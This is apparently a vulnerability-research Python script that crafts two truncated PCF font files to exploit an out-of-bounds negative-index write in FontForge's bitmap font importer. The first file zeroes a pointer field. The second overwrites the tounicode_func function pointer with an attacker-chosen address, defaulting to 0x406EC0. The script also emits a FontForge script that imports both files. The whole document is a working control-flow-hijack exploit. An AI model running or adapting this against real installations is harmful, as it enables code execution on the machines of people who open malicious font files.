#!/usr/bin/env python3
"""W28: two truncated PCFs that zero Encoding.tounicode and then set
Encoding.tounicode_func to a chosen non-PIE address via negative glyph writes.

Uses the pinned truncated.pcf TOC layout from make-callpath-case.py. With
min2=max2=value>>8 and min1=max1=value&0xff, tot=1 and i=0, so the pinned RHS
at fvimportbdf.c:1751 is exactly value. The low byte of the index byte at 0x122
selects glyph = low-256, i.e. the 4-byte destination encs[glyph].
"""
import pathlib
import struct
import sys

HERE = pathlib.Path(__file__).resolve().parent
data = bytearray((HERE / "truncated.pcf").read_bytes()[:0x123])


def case(name, glyph, value):
    if not -256 <= glyph <= -1:
        raise SystemExit("glyph must be -256..-1")
    if not 0 <= value <= 0xFFFFFF:
        raise SystemExit("value must fit 24 bits")
    blob = bytearray(data)
    struct.pack_into("<HHHH", blob, 0x118, value >> 8, value >> 8, value & 0xFF, value & 0xFF)
    blob[0x122] = (256 + glyph) & 0xFF
    out = HERE / name
    out.write_bytes(blob)
    print(f"{name}: glyph={glyph} value={value:#08x} target=encs{glyph * 4}")


# Derived from the W28 nopie gdb delta: tounicode at +72, tounicode_func at +88.
case("funczero.pcf", -174, 0)
case("funcptr.pcf", -170, int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x406EC0)
(HERE / "import-funcpath.ff").write_text(
    f'New()\nImport("{HERE / "funczero.pcf"}")\n'
    f'Import("{HERE / "funcptr.pcf"}")\n'
)
